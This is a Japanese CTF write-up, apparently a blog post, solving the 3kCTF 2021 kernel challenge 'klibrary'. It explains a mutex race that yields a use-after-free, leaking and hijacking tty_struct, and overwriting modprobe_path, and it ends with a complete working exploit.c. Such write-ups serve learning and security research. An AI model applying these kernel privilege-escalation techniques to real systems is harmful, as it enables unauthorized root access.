@@ -1,0 +1,262 @@
+
+<p><script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script></p>
+ <!-- KEYWORDS HERE -->
+<div class="keywords"><span class="btitle">keywords</span>
+<p>kernel exploit, tty_struct, kROP to overwrite modprobe_path, race w/ uffd</p>
+</div>
+<div class="contents">[:contents]</div>
+<p></p>
+<h3>1: イントロ</h3>
+<p></p>
+<p>このエントリは<a href="https://adventar.org/calendars/4182">TSG Advent Calendar 2019</a>の24日目の記事です。実に700日ほど遅れての投稿になります。</p>
+<p>前回は <strong>fiord</strong> さんによる「<a href="http://hyoga.hatenablog.com/entry/2019/12/22/012552">この世界で最も愛しい生物とそれに関する技術について - アルゴリズマーの備忘録</a>」でした。次回は <strong>JP3BGY</strong> さんによる「<a href="https://jp3bgy.github.io/blog/linux/2019/12/26/GCC.html">GCCで返答保留になった話 | J&#x27;s Lab</a>」 でした。</p>
+<p></p>
+<p>すごくお腹が空いたので、いつぞや開催された <strong>3kCTF 2021</strong> のkernel問題である <strong>klibrary</strong> を解いていこうと思います。なんか最近サンタさん来ないんですが、悪い子なのかも知れないです。</p>
+<p></p>
+<h3>2: static</h3>
+<p></p>
+<p>リシテア曰く。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">lysithea.sh</div>
+<pre class="prettyprint linenums lang-sh">
+===============================
+Drothea v1.0.0
+[.] kernel version:
+Linux version 5.9.10 (maher@maher) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for U1
+[+] CONFIG_KALLSYMS_ALL is disabled.
+cat: can&#x27;t open &#x27;/proc/sys/kernel/unprivileged_bpf_disabled&#x27;: No such file or directory
+[!] unprivileged userfaultfd is enabled.
+Ingrid v1.0.0
+[.] userfaultfd is not disabled.
+[-] CONFIG_DEVMEM is disabled.
+===============================
+</pre>
+<p></p>
+<p>割と手堅いけど、uffdができる。あとなんか<code>vmlinux</code>をstripせずにそのままくれてた、クリスマスプレゼントかも知れない。どうでもいいけど<code>CONFIG_KALLSYMS_ALL</code>が無効になってる、めずらし。SMEP/SMAP/KPTI/KASLRは全部有効。</p>
+<p></p>
+<p></p>
+<h3>3: module overview</h3>
+<p></p>
+<p>chrデバイス。<code>Book</code>構造体のdouble-linked listを保持。典型的なノート問題。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">book.c</div>
+<pre class="prettyprint linenums lang-c">
+struct Book {
+  char book_description[BOOK_DESCRIPTION_SIZE];
+  unsigned long index;
+  struct Book* next;
+  struct Book* prev;
+} *root;
+</pre>
+<p></p>
+<p>mutexを使っている。だが、わざわざ2つ(<code>ioctl_lock</code>, <code>remove_all_lock</code>)用意しているせいで、ロックを正常に取れていない(eg: <code>REMOVE_ALL + REMOVE</code>等)。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">.c</div>
+<pre class="prettyprint linenums lang-c">
+static DEFINE_MUTEX(ioctl_lock);
+static DEFINE_MUTEX(remove_all_lock);
+
+  if (cmd == CMD_REMOVE_ALL) {
+    mutex_lock(&amp;remove_all_lock);
+    remove_all();
+    mutex_unlock(&amp;remove_all_lock);
+  } else {
+    mutex_lock(&amp;ioctl_lock);
+
+    switch (cmd) {
+    case CMD_ADD:
+      add_book(request.index);
+      break;
+    case CMD_REMOVE:
+      remove_book(request.index);
+      break;
+    case CMD_ADD_DESC:
+      add_description_to_book(request);
+      break;
+    case CMD_GET_DESC:
+      get_book_description(request);
+      break;
+    }
+</pre>
+<p></p>
+<p>THE・ノート問題のため、モジュールの詳細は省略。ソースコードを見てください。</p>
+<p></p>
+<p></p>
+<h3>4: vuln </h3>
+<p></p>
+<p>上に貼ったコードの通り、<code>REMOVE_ALL</code>とその他のコマンドで異なるmutexを使っているため、この2種の操作でレースが生じる。<code>remove_all()</code>は双方向リストを根っこから辿って順々に<code>kfree()</code>していく。<code>add_description_to_book()/get_book_description()</code>では、リストからユーザ指定の<code>index</code>を持つ<code>Book</code>を探し出し、<code>copy_from_user()/copy_to_user()</code>で<code>Book</code>構造体にデータを直接出し入れする。</p>
+<p>よって、<code>(add|get)_description()</code>で処理を止めている間に<code>remove_all()</code>で該当ノートを消してしまえばkUAFになる。最初にリシテアが言っていたようにunprivileged uffdが許可されているため、レースも簡単。</p>
+<p></p>
+<h3>5: leak kbase via tty_struct</h3>
+<p></p>
+<p>さて、<code>struct Book</code>は<code>description</code>を直接埋め込んでいるため<code>kmalloc-1024</code>に入る大きさである。この大きさと言えば<code>struct tty_struct</code>。leakした後に適当にテキストっぽいものを選べばkbase leak完了! あと<code>tty_struct</code>はkbaseの他にもヒープのアドレス、とりわけ自分自身を指すアドレスを持っているため、これも忘れずにleakしておく。</p>
+<p></p>
+<p></p>
+<h3>6: get RIP via vtable in tty_struct</h3>
+<p></p>
+<p>さてさて、今度はRIPを取る必要がある。や、まぁRIP取らなくても年は越せるんですが。</p>
+<p>原理はleakと同じで、<code>copy_to_user()</code>でフォルトを起こして止めている間に、<code>remove_all</code>でそいつを<code>kfree()</code>しちゃう。その直後に<code>tty_struct</code>を確保することで、<code>tty_struct</code>に任意の値を書き込むことが出来る。</p>
+<p>書き込む位置は指定できず、必ず<code>tty_struct</code>の先頭から0x300byte書き込むことになる。このとき、先頭のマジックナンバー(<code>0x5401</code>)が壊れていると<code>tty_ioctl()@drives/tty/tty_io.c</code>内の<code>tty_paranoia_check()</code>で処理が終わってしまうため、これだけはちゃんと上書きしておく。</p>
+<p></p>
+<p></p>
+<p><code>tty_struct + 0x200</code>あたりにフェイクのvtableとして実行したいコードのアドレスを入れておく。あとは<code>ops</code>を書き換えるために、(オフセットとか考えるのめんどいから)全部<code>tty_struct + 0x200</code>のアドレスで上書きする。ここで必要な<code>tty_struct</code>自身のアドレスは、先程のleakの段階で入手できている。これでRIPも取れました。</p>
+<p></p>
+<p></p>
+<h3>7: overwriting modprobe_path just by repeating single gadget</h3>
+<p></p>
+<p>さてさてさて、このあとの方針は色々とありそう。以前解いた<a href="https://smallkirby.hatenablog.com/entry/2021/02/22/053507">nutty</a>では<code>tty_struct</code>の中でkROPをして<code>commit(pkc(0))</code>していた。けど、これはまぁ色々と面倒くさいし、この問題と少し状況が異なっていてstack pivotが簡単に出来なかったため却下。</p>
+<p>上のスタックトレースは、<code>ioctl(ptmxfd, 0xdeadbeef, 0xcafebabe)</code>の結果なのだが、<code>RDX</code>/<code>RSI</code>が制御できていることが分かる。よって、<code>mov Q[rdx], rsi</code>とか<code>mov Q[rsi], rdx</code>みたいなガジェットを使うことで、任意アドレスの8byteを書き換えられる。<code>tty_struct</code>は意外と頑丈らしく、全部破壊的に書き換えたとしても正常に終了してくれるっぽいので、このガジェットを何回でも呼び出すことが出来る。よって、これで<code>modprobe_path</code>を書き換えれば終わり。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">gadget.txt</div>
+<pre class="prettyprint linenums lang-txt">
+0xffffffff8113e9b0: mov qword [rdx], rsi ; ret  ;  (2 found)
+0xffffffff81018c30: mov qword [rsi], rdx ; ret  ;  (4 found)
+</pre>
+<p></p>
+<p>やっぱりこの方法めっちゃ楽。</p>
+<p></p>
+<h3>8: exploit</h3>
+<p></p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">exploit.c</div>
+<pre class="prettyprint linenums lang-c">
+#include &quot;./exploit.h&quot;
+#include &lt;fcntl.h&gt;
+#include &lt;sched.h&gt;
+
+/*********** commands ******************/
+#define DEV_PATH &quot;/dev/library&quot;   // the path the device is placed
+#define CMD_ADD			0x3000
+#define CMD_REMOVE		0x3001
+#define CMD_REMOVE_ALL	0x3002
+#define CMD_ADD_DESC	0x3003
+#define CMD_GET_DESC 	0x3004
+
+#define BOOK_DESCRIPTION_SIZE 0x300
+
+/**********  types *********************/
+typedef struct {
+	unsigned long index;
+	char* userland_pointer;
+} Request;
+
+#define GET_DESC_REGION          0x40000
+#define ADD_DESC_REGION    0x50000
+
+/*********** globals ****************/
+
+char bigbuf[PAGE] = {0};
+int fd, ttyfd;
+ulong kbase = 0, tty_addr = 0;
+scu mov_addr_rdx_rsi = 0x13e9b0;
+
+// (END globals)
+
+/********** utils ******************/
+
+void add_book(int fd, ulong index) {
+  Request req = {.index = index,};
+  assert(ioctl(fd, CMD_ADD, &amp;req) == 0);
+}
+
+void remove_all(int fd) {
+  assert(ioctl(fd, CMD_REMOVE_ALL, remove_all) == 0);
+}
+
+// (END utils)
+
+static void handler(ulong addr) {
+  puts(&quot;[+] removing all books.&quot;);
+  remove_all(fd);
+  puts(&quot;[+] allocating tty_struct...&quot;);
+  assert((ttyfd = open(&quot;/dev//ptmx&quot;, O_RDWR | O_NOCTTY)) &gt; 3);
+}
+
+int main(int argc, char *argv[]) {
+  system(&quot;echo -ne \&quot;\\xff\\xff\\xff\\xff\&quot; &gt; /tmp/nirugiri&quot;);
+  system(&quot;echo -ne \&quot;#!/bin/sh\nchmod 777 /flag.txt &amp;&amp; cat /flag.txt\&quot; &gt; /tmp/a&quot;);
+  system(&quot;chmod +x /tmp/nirugiri&quot;);
+  system(&quot;chmod +x /tmp/a&quot;);
+  assert((fd = open(DEV_PATH, O_RDWR)) &gt; 2);
+
+  // spray
+  for (int ix = 0; ix != 0x10; ++ix)
+    assert(open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY) &gt; 3);
+
+  // prepare
+  add_book(fd, 0); add_book(fd, 1);
+
+  // set uffd region
+  struct skb_uffder *uffder = new_skb_uffder(GET_DESC_REGION, 1, bigbuf, handler, &quot;getdesc&quot;);
+  skb_uffd_start(uffder, NULL);
+  sleep(1);
+
+  // invoke uffd fault and remove all books while halting
+  Request req = {.index = 1, .userland_pointer = (char*)GET_DESC_REGION};
+  assert(ioctl(fd, CMD_GET_DESC, &amp;req) == 0);
+
+  assert((kbase = ((ulong*)GET_DESC_REGION)[0x210 / 8] - 0x14fc00) != 0);
+  assert((tty_addr = ((ulong*)GET_DESC_REGION)[0x1c8 / 8] + 0x800) != 0);
+  ulong modprobe_path = kbase + 0x837d00;
+  ulong rop_start = kbase + mov_addr_rdx_rsi;
+  printf(&quot;[!] kbase: 0x%lx\n&quot;, kbase);
+  printf(&quot;[!] tty_struct : 0x%lx\n&quot;, tty_addr); // tty_addr is the Book[0]
+
+  /****************************************************/
+
+  // prepare
+  add_book(fd, 0);
+
+  // set uffd region
+  struct skb_uffder *uffder2 = new_skb_uffder(ADD_DESC_REGION, 1, bigbuf, handler, &quot;adddesc&quot;);
+  skb_uffd_start(uffder2, NULL);
+  *(unsigned*)bigbuf = 0x5401; // magic for paranoia check in tty_ioctl()
+
+  // prepare fake vtable at the bottom of tty_struct
+  for (int ix = 1; ix != BOOK_DESCRIPTION_SIZE / 8; ++ix) {
+    ((unsigned long*)bigbuf)[ix] = tty_addr + 0x200;
+  }
+  for (int ix = BOOK_DESCRIPTION_SIZE / 8 / 3 * 2; ix != BOOK_DESCRIPTION_SIZE / 8; ++ix) {
+    ((unsigned long*)bigbuf)[ix] = rop_start;
+  }
+
+  // invoke fault
+  Request req2 = {.index = 0, .userland_pointer = (char*)ADD_DESC_REGION};
+  assert(ioctl(fd, CMD_ADD_DESC, &amp;req2) == 0);
+
+  puts(&quot;[+] calling tty ioctl...&quot;);
+  char *uo = &quot;/tmp/a\x00&quot;;
+  ioctl(ttyfd, ((unsigned *)uo)[0], modprobe_path);
+  ioctl(ttyfd, ((unsigned *)uo)[1], modprobe_path + 4);
+
+  puts(&quot;[+] executing evil script...&quot;);
+  system(&quot;/tmp/nirugiri&quot;);
+  system(&quot;cat /flag.txt&quot;);
+
+  // end of life
+  puts(&quot;[ ] END of life...&quot;);
+  exit(0);
+}
+</pre>
+<p></p>
+<h3>9: アウトロ</h3>
+<p></p>
+<p></p>
+<p></p>
+<p>風花雪月は4周目黄色ルートが終わりました。流石に飽きてきた可能性があり、5周目を始めるかどうか迷っています。</p>
+<p></p>
+<p>今年のアドベントカレンダーでは、「実家までこっそりと帰省して、バレないようにピンポンダッシュして東京に戻る」か「世界一きれいに手書きの『ぬ』を書きたい」のどちらかをテーマに書こうと思っています。また700日後にお会いしましょう。</p>
+<p></p>
+<p></p>
+<h3>10: 参考</h3>
+<p>1: ニルギリ</p>
+<p><a href='https://youtu.be/yvUvamhYPHw'>https://youtu.be/yvUvamhYPHw</a></p>
+<p>2: </p>
+<p><a href=''></a></p>
+<p>3: </p>
+<p><a href=''></a></p>
+
+<p></p><p></p>
+<p></p><p></p>
+<p>続く...</p>
+<p></p><p></p>
